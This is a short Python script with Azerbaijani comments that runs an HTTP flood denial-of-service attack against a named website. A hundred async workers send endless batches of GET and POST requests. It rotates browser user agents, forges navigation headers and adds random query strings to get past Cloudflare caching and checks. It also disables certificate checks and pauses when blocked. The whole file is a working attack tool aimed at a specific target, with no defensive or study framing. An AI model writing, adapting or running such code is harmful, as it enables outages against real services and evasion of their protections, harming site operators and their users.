import asyncio
import httpx
import random
import string
import time

TARGET_URL = "https://streamwin.win"
WORKERS = 100 # Brauzer olmadığı üçün sayı 100-ə qaldıra bilərik
BATCH_SIZE = 50 # Hər dalğada 50 sorğu

def random_str(n=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

# Real brauzer başlıqları
UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edge/124.0.0.0"
]

async def attack_worker(worker_id):
    # Cloudflare HTTP/2 yoxlamasını keçmək üçün modern bir client
    async with httpx.AsyncClient(http2=True, verify=False, timeout=10.0) as client:
        print(f"🚀 Worker {worker_id} aktivdir...")
        while True:
            try:
                tasks = []
                for _ in range(BATCH_SIZE):
                    headers = {
                        "User-Agent": random.choice(UA_LIST),
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                        "Accept-Language": "en-US,en;q=0.9",
                        "Accept-Encoding": "gzip, deflate, br",
                        "Connection": "keep-alive",
                        "Sec-Fetch-Dest": "document",
                        "Sec-Fetch-Mode": "navigate",
                        "Sec-Fetch-Site": "none",
                        "Cache-Control": "max-age=0"
                    }
                    
                    # Dinamik URL (Cloudflare Keşi üçün)
                    url = f"{TARGET_URL}/?{random_str()}={random_str()}"
                    
                    # Random olaraq GET və ya POST (Backend-i yormaq üçün)
                    if random.random() > 0.8:
                        tasks.append(client.post(url, headers=headers, data={random_str(): random_str()}))
                    else:
                        tasks.append(client.get(url, headers=headers))
                
                # Bütün sorğuları eyni anda göndər
                await asyncio.gather(*tasks, return_exceptions=True)
                
            except Exception:
                await asyncio.sleep(1) # IP bloklansa bir az gözlə

async def main():
    print(f"🔥 RAILWAY TURBO FLOOD INITIALIZED")
    print(f"[*] Target: {TARGET_URL}")
    
    # Bütün workerləri birdən başladırıq
    workers = [attack_worker(i) for i in range(WORKERS)]
    await asyncio.gather(*workers)

if __name__ == "__main__":
    asyncio.run(main())
